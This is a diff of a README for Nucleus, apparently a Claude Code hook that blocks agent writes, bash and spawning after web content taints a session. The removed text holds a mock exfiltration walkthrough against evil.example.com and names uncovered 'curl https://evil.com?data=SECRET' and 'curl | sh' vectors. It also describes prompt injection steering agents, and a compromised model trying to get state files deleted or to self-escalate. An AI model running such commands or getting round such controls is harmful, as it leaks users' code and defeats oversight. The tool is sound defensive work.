@@ -1,166 +1,66 @@
-# Nucleus Claude Code Hook — Quickstart
-
-**Runtime information flow enforcement for Claude Code tool calls.**
-
-Nucleus hooks into Claude Code's [PreToolUse](https://code.claude.com/docs/en/hooks) event to track how data flows through your session. When web content enters the session, the hook blocks any subsequent writes, bash commands, or agent spawning that would be influenced by that content.
-
-## Why information flow control?
-
-Most agent security tools answer: *"Is this tool allowed?"*
-
-That's the wrong question. The right question is: *"Is this tool allowed **given what data has entered the session?**"*
-
-Reading a file is safe. Fetching a URL is safe. But fetching a URL and then writing to disk is a potential exfiltration path — the URL's response could contain prompt injection that steers the agent to leak file contents. This is the attack surface that [Invariant Labs](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks), [AgentSeal](https://agentseal.org/blog/mcp-server-security-findings), and [OWASP's MCP Top 10](https://mcpplaygroundonline.com/blog/mcp-security-tool-poisoning-owasp-top-10-mcp-scan) have documented across 1,800+ MCP servers.
-
-Nucleus tracks this with an **information flow control (IFC) kernel** — a technique from systems security research (Denning's lattice model, 1976). Every piece of data that enters the session gets a label:
-
-| Source | Integrity | Authority | What it means |
-|--------|-----------|-----------|---------------|
-| User prompt | Trusted | Directive | The user asked for this |
-| File read | Trusted | Directive | Local, trusted data |
-| Web fetch | **Adversarial** | **NoAuthority** | Untrusted, could be attacker-controlled |
-| Web search | **Adversarial** | **NoAuthority** | Untrusted results |
-
-Labels propagate through the session. Once web content enters, every subsequent operation inherits its taint. A write operation requires `Suggestive` authority, but web-tainted data has `NoAuthority` — the kernel blocks the escalation.
+# Nucleus — Security for Claude Code in 60 seconds
 
 ## Install
 
 ```bash
 cargo install --git https://github.com/coproduct-opensource/nucleus nucleus-claude-hook
 nucleus-claude-hook --setup
+# restart Claude Code
 ```
 
-Restart Claude Code. The hook is now active.
-
-## Try it: taint walkthrough
-
-You can verify the hook works by simulating the attack sequence outside Claude Code. Open a terminal and run these three commands:
-
-**Step 1 — Read a file (safe, trusted data):**
+## Verify
 
 ```bash
-echo '{"session_id":"demo","tool_name":"Read","tool_input":{"file_path":"/etc/hostname"}}' \
-  | nucleus-claude-hook
+nucleus-claude-hook --smoke-test
+# ✓ Read file → allowed
+# ✓ WebFetch → allowed (session tainted)
+# ✓ Write after taint → denied (flow control working!)
+# 3/3 tests passed
 ```
 
-```
-nucleus: read_files /etc/hostname -> allow [exposure: 1/3, profile: safe_pr_fixer, flow_node: 1]
-{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"allow"}}
-```
+## What it does
 
-The kernel assigns `integ=Trusted, auth=Directive` — this is local data, safe to act on.
-
-**Step 2 — Fetch a URL (safe to read, but taints the session):**
-
-```bash
-echo '{"session_id":"demo","tool_name":"WebFetch","tool_input":{"url":"https://evil.example.com"}}' \
-  | nucleus-claude-hook
-```
+Nucleus tracks **what data has entered your session** and blocks dangerous combinations:
 
 ```
-nucleus: web_fetch https://evil.example.com -> allow [exposure: 2/3, profile: safe_pr_fixer, flow_node: 2]
-{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"allow"}}
+✓ Read a file            — safe
+✓ Search the web          — safe (but taints the session)
+✗ Write based on web data — BLOCKED (web content can't steer writes)
 ```
 
-Allowed — reading web content is safe. But the session now carries `integ=Adversarial, auth=NoAuthority`.
-
-**Step 3 — Try to write (BLOCKED):**
-
-```bash
-echo '{"session_id":"demo","tool_name":"Write","tool_input":{"file_path":"/tmp/pwned.txt","content":"exfiltrated"}}' \
-  | nucleus-claude-hook
-```
-
-```
-nucleus: write_files /tmp/pwned.txt -> deny [exposure: 2/3, profile: safe_pr_fixer, flow_node: 3]
-
-BLOCKED: no-authority-escalation
-Action: OutboundAction (id=3) label={conf=Internal, integ=Adversarial, auth=NoAuthority}
-Causal chain:
-  <- WebContent (id=2) label={conf=Public, integ=Adversarial, auth=NoAuthority}
-  <- FileRead (id=1) label={conf=Internal, integ=Trusted, auth=Directive}
-```
-
-The write is denied. The receipt shows exactly why: the web content (node 2) propagated adversarial taint to the write (node 3). The kernel's `no-authority-escalation` rule prevents low-authority data from steering a privileged action.
-
-**Clean up the demo session state:**
-
-```bash
-rm /tmp/nucleus-hook/demo.json /tmp/nucleus-hook/.demo.hwm 2>/dev/null
-```
-
-## The real gotcha: your session is now tainted
-
-After a `WebFetch` or `WebSearch`, the session is tainted for the rest of its lifetime. You cannot write, edit, run bash, push, or spawn agents. This is by design.
-
-**This means:**
-
-- If you search the web for how to fix a bug, you cannot then write the fix in the same session. Restart Claude Code to reset.
-- If any tool call fetches a URL, everything after is read-only.
-- The Agent tool is also blocked — a subprocess could bypass the parent's taint restrictions.
-
-This is aggressive. The solution is **compartments**.
+This prevents prompt injection attacks where malicious web content tricks the agent into exfiltrating your code.
 
 ## Compartments: research, then code, then test
 
-Instead of one session locked forever, use compartments to separate phases:
+Instead of "one web fetch = locked forever," use compartments:
 
 ```bash
-# Start in research mode
-COMPARTMENT_PATH=$(nucleus-claude-hook --compartment-path <session-id>)
-echo "research" > "$COMPARTMENT_PATH"
+# Set via env var or side-channel file
+NUCLEUS_COMPARTMENT=research   # read + web (no writes)
+NUCLEUS_COMPARTMENT=draft      # read + write (no web — taint clears!)
+NUCLEUS_COMPARTMENT=execute    # read + write + bash (no push)
 ```
 
-| Compartment | Read | Write | Bash | Web | Use case |
-|-------------|------|-------|------|-----|----------|
-| `research` | yes | no | no | yes | Browse docs, search, read code |
-| `draft` | yes | yes | no | no | Write code (no web taint!) |
-| `execute` | yes | yes | yes | no | Run tests, build |
-| `breakglass` | yes | yes | yes | yes | Emergency (time-limited, enhanced audit) |
+Flow graph resets when switching compartments — research taint doesn't carry into draft.
 
-**The key insight**: when you switch from `research` to `draft`, the flow graph resets. The web taint from research doesn't carry into draft. But draft blocks web entirely — so no new adversarial content can enter while you're writing code.
+## Useful commands
 
+```bash
+nucleus-claude-hook --doctor         # Check everything's working
+nucleus-claude-hook --show-profile safe_pr_fixer  # See what's allowed
+nucleus-claude-hook --receipts       # View audit trail
+nucleus-claude-hook --status         # Show active sessions
+nucleus-claude-hook --help           # All options
 ```
-RESEARCH MODE
-  ✓ Read file       → allowed
-  ✓ WebFetch        → allowed (session tainted)
-  ✗ Write file      → BLOCKED (web taint)
-
-research → draft (requires human approval)
-  Flow graph reset: web taint cleared
-
-DRAFT MODE
-  ✓ Write file      → ALLOWED (clean flow graph!)
-  ✗ WebFetch        → BLOCKED (draft ceiling)
-```
-
-Upward transitions (research → execute) require human approval — the hook returns `ask` so Claude Code prompts you. The model cannot self-escalate because the compartment file uses a keyed hash filename that's unpredictable.
 
 ## Profiles
 
-| Profile | Read | Write | Bash | Web | Git | Agent | Use case |
-|---------|------|-------|------|-----|-----|-------|----------|
-| `read_only` | yes | no | no | no | no | no | Auditing |
-| `code_review` | yes | no | no | no | no | no | PR review |
-| `edit_only` | yes | yes | no | no | no | no | Focused editing |
-| `fix_issue` | yes | yes | yes | yes | commit | yes | Bug fixes |
-| `safe_pr_fixer` | yes | yes | yes | yes | commit | yes | **Default** — full dev, no push |
-| `release` | yes | yes | yes | yes | push+PR | yes | Ship it |
-| `permissive` | yes | yes | yes | yes | yes | yes | Audit-only, no enforcement |
-
-All profiles except `permissive` enforce the flow graph.
-
-## Tamper detection
-
-If someone (or a compromised model) asks you to delete the session state files to "fix" the hook:
-
-```
-nucleus: TAMPER DETECTED — session state deleted (expected hwm=5).
-A compromised model may have asked you to delete session files.
-All operations denied until session restart.
-```
-
-The hook maintains a separate high-water-mark file that survives state file deletion. Tampering is detected and everything fails closed.
+| Profile | Write | Bash | Web | Git Push | Default |
+|---------|-------|------|-----|----------|---------|
+| `read_only` | no | no | no | no | |
+| `safe_pr_fixer` | yes | yes | yes | **no** | **yes** |
+| `release` | yes | yes | yes | yes | |
+| `permissive` | yes | yes | yes | yes | audit-only |
 
 ## Uninstall
 
@@ -168,29 +68,36 @@ The hook maintains a separate high-water-mark file that survives state file dele
 cargo uninstall nucleus-claude-hook
 ```
 
-Then remove the `hooks` block from `~/.claude/settings.json`.
+Remove the `hooks` block from `~/.claude/settings.json`.
 
-## Honest gaps
+---
 
-We believe in shipping with transparency. Here's what this tool does NOT do:
+## How it works (the details)
 
-1. **The flow graph is a linear chain, not a true DAG.** Claude Code's hook protocol doesn't tell us which previous tool outputs informed the current call. We approximate with a sequential chain — every operation after a web fetch inherits taint. This is conservative (may over-block) but not unsound.
+Nucleus uses **information flow control** (IFC) — every piece of data gets a security label:
 
-2. **`curl` exfiltration is not blocked by the command lattice.** `safe_pr_fixer` blocks `curl | sh` but not `curl https://evil.com?data=SECRET`. The flow graph catches this after web taint, but a pre-taint `read -> curl` sequence is gated only by the 3-leg exposure accumulator (which requires private data + untrusted content + exfil vector to all be present).
+| Source | Integrity | What it means |
+|--------|-----------|---------------|
+| File read | Trusted | Local, safe data |
+| Web fetch | **Adversarial** | Untrusted, could be attacker-controlled |
 
-3. **No PostToolUse hook.** The system is open-loop — it decides before tool execution but cannot observe outcomes. If Claude Code adds PostToolUse reconciliation, the kernel can close this loop.
+Labels propagate. When web content enters, subsequent writes inherit adversarial integrity. The kernel blocks the escalation — adversarial data can't steer privileged actions.
 
-4. **Session state lives in `/tmp`.** It's owner-only (0700 permissions) and tamper-detected, but not encrypted. On shared systems, other root-level processes could read session state.
+The kernel is backed by **181 formal verification artifacts** (68 Kani bounded model checks + 113 Lean 4 theorems) proving the lattice algebra and flow rules are correct.
 
-## Architecture
+## Tamper detection
 
-The hook is backed by the [portcullis](https://github.com/coproduct-opensource/nucleus/tree/main/crates/portcullis) permission kernel:
+If someone asks you to delete session files to "fix" the hook:
 
-- **Capability lattice**: Product of 13 capability dimensions forming a distributive Heyting algebra, verified by [Kani](https://github.com/model-checking/kani) bounded model checking and [Lean 4](https://leanprover.github.io/) theorem proving.
-- **Exposure accumulator**: Tracks the three components of the "uninhabitable state" (private data + untrusted content + exfil vector). When all three are present, exfiltration operations require human approval.
-- **IFC labels**: 5-dimensional information flow labels (confidentiality, integrity, authority, provenance, freshness) based on [Denning's lattice model](https://doi.org/10.1145/360051.360056).
+```
+nucleus: TAMPER DETECTED — session state deleted (expected hwm=5).
+A compromised model may have asked you to delete session files.
+```
+
+The hook maintains a separate high-water-mark file. Tampering fails closed.
 
 ## Links
 
 - [Source](https://github.com/coproduct-opensource/nucleus)
+- [Formal methods assessment](https://github.com/coproduct-opensource/nucleus/blob/main/FORMAL_METHODS.md)
 - [Claude Code hooks docs](https://code.claude.com/docs/en/hooks)
